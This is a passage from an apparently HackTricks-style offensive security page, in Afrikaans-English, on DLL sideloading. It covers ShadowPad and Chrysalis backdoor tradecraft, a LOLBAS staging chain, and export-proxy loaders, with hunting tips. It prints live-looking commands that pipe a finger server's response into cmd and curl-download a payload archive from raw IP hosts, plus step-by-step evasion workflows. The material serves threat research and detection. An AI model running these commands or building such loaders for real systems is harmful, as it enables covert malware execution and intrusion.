3. **Encrypted payload blob** – dikwels gestoor as `<name>.tmp` in dieselfde directory. Nadat die decrypted payload in memory gemap is, delete die loader die TMP file om forensic evidence te vernietig.

Tradecraft notes:

* Deur die signed EXE te hernoem (terwyl die oorspronklike `OriginalFileName` in die PE header behou word), kan dit as ’n Windows binary voordoen maar steeds die vendor signature behou, so replicaer Ink Dragon se gewoonte om `conhost.exe`-agtige binaries te laat val wat eintlik AMD/NVIDIA utilities is.
* Omdat die executable trusted bly, hoef die meeste allowlisting controls net jou malicious DLL langs dit te hê. Fokus op die aanpassing van die loader DLL; die signed parent kan tipies onaangeraak loop.
* ShadowPad se decryptor verwag dat die TMP blob langs die loader woon en writable is sodat dit die file kan zero nadat dit gemap is. Hou die directory writable totdat die payload laai; sodra dit in memory is, kan die TMP file veilig vir OPSEC delete word.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators paar DLL sideloading met LOLBAS sodat die enigste custom artifact op disk die malicious DLL langs die trusted EXE is:

- **Remote command loader (Finger):** Hidden PowerShell spawn `cmd.exe /c`, trek commands vanaf ’n Finger server, en pipe dit na `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` trek TCP/79 text; `| cmd` execute die server response, wat operators toelaat om tweede stage server-side te roteer.

- **Built-in download/extract:** Download ’n archive met ’n benign extension, unpack dit, en stage die sideload target plus DLL onder ’n random `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` verberg progress en volg redirects; `tar -xf` gebruik Windows se built-in tar.

- **WMI/CIM launch:** Start die EXE via WMI sodat telemetry ’n CIM-created process wys terwyl dit die colocated DLL laai:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Werk met binaries wat local DLLs verkies (bv. `intelbq.exe`, `nearby_share.exe`); payload (bv. Remcos) loop onder die trusted name.

- **Hunting:** Alert op `forfiles` wanneer `/p`, `/m`, en `/c` saam verskyn; ongewoon buite admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

’n Onlangse Lotus Blossom intrusion het ’n trusted update chain misbruik om ’n NSIS-packed dropper te lewer wat ’n DLL sideload plus volledig in-memory payloads gestage het.

Tradecraft flow
- `update.exe` (NSIS) skep `%AppData%\Bluetooth`, merk dit **HIDDEN**, laat ’n hernoemde Bitdefender Submission Wizard `BluetoothService.exe`, ’n malicious `log.dll`, en ’n encrypted blob `BluetoothService` val, en launch dan die EXE.
- Die host EXE import `log.dll` en roep `LogInit`/`LogWrite`. `LogInit` mmap-load die blob; `LogWrite` decrypt dit met ’n custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material derived van ’n prior hash), overwrite die buffer met plaintext shellcode, free temps, en jump na dit.
- Om ’n IAT te vermy, resolve die loader APIs deur export names te hash met **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, en pas dan ’n Murmur-style avalanche (**0x85EBCA6B**) toe en vergelyk teen salted target hashes.

Main shellcode (Chrysalis)
- Decrypt ’n PE-like main module deur add/XOR/sub met key `gQ2JR&9;` oor vyf passes te herhaal, en laai dan dinamies `Kernel32.dll` → `GetProcAddress` om import resolution te voltooi.
- Rekonstrueer DLL name strings by runtime via per-character bit-rotate/XOR transforms, en laai dan `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Gebruik ’n tweede resolver wat die **PEB → InMemoryOrderModuleList** deurblaai, elke export table in 4-byte blocks met Murmur-style mixing parse, en val net terug op `GetProcAddress` as die hash nie gevind word nie.

Embedded configuration & C2
- Config leef binne die laat-val `BluetoothService` file by **offset 0x30808** (size **0x980**) en word RC4-decrypted met key `qwhvb^435h&*7`, wat die C2 URL en User-Agent openbaar.
- Beacons bou ’n dot-delimited host profile, prepend tag `4Q`, en RC4-encrypt dan met key `vAuig34%^325hGV` voor `HttpSendRequestA` oor HTTPS. Responses word RC4-decrypted en deur ’n tag switch gestuur (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode word deur CLI args beheer: geen args = install persistence (service/Run key) wat na `-i` wys; `-i` relaunch self met `-k`; `-k` skip install en run payload.

Alternate loader observed
- Dieselfde intrusion het Tiny C Compiler laat val en `svchost.exe -nostdlib -run conf.c` vanaf `C:\ProgramData\USOShared\` uitgevoer, met `libtcc.dll` langsaan. Die attacker-supplied C source het shellcode ingebed, gecompileer, en in-memory uitgevoer sonder om die disk met ’n PE aan te raak. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Hierdie TCC-gebaseerde compile-and-run stadium het `Wininet.dll` tydens runtime ingevoer en 'n tweede-stadium shellcode van 'n hardcoded URL afgetrek, wat 'n buigsame loader gegee het wat voorgegee het om 'n compiler run te wees.

## Signed-host sideloading met export proxying + host thread parking

Sommige DLL sideloading chains voeg **stability engineering** by sodat die legit host lank genoeg aan die lewe bly om later stadiums netjies te laai, eerder as om te crash nadat die malicious DLL gelaai is.

Waargenome patroon
- Drop 'n trusted EXE langs 'n malicious DLL met die verwagte dependency name soos `version.dll`.
- Die malicious DLL **proxy elke verwagte export** terug na die regte system DLL (byvoorbeeld `%SystemRoot%\\System32\\version.dll`) sodat import resolution steeds slaag en die host process aanhou werk.
- Nadat dit gelaai is, **patch** die malicious DLL die host entry point sodat die main thread in 'n oneindige `Sleep` loop val in plaas daarvan om te exit of code paths te loop wat die process sou beëindig.
- 'n Nuwe thread doen die werklike malicious werk: die volgende-stadium DLL name of path dekripteer (RC4/XOR is algemeen), en dit dan met `LoadLibrary` launch.

Hoekom dit saak maak
- Normale DLL proxying behou API compatibility, maar dit waarborg nie dat die host lank genoeg aan die lewe bly vir later stadiums nie.
- Om die main thread in `Sleep(INFINITE)` te parkeer is 'n eenvoudige manier om die signed process resident te hou terwyl die loader dekripsie, staging, of network bootstrap in 'n worker thread uitvoer.
- Om net te hunt vir 'n verdagte `DllMain` sal hierdie patroon mis as die interessante gedrag eers plaasvind nadat die host entry point ge-patch is en 'n secondary thread begin.

Minimale workflow
1. Kopieer die signed host EXE en bepaal die DLL wat dit vanaf die local directory oplos.
2. Bou 'n proxy DLL wat dieselfde functions export en hulle na die legit DLL forward.
3. In `DllMain(DLL_PROCESS_ATTACH)`, skep 'n worker thread.
4. Vanaf daardie thread, patch die host entry point of main thread start routine sodat dit op `Sleep` loop.
5. Decrypt die volgende-stadium DLL name/config en roep `LoadLibrary` of manual-map die payload.

Defensive pivots
- Signed processes wat `version.dll` of soortgelyke common libraries vanaf hul eie application directory laai eerder as van `System32`.
- Memory patches by die process entry point kort ná image load, veral jumps/calls wat na `Sleep`/`SleepEx` herlei is.
- Threads wat deur 'n proxy DLL geskep is en wat onmiddellik `LoadLibrary` op 'n tweede DLL met 'n decrypted naam aanroep.
- Full-export proxy DLLs wat langs vendor executables in writable staging directories soos `ProgramData`, `%TEMP%`, of unpacked archive paths geplaas is.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
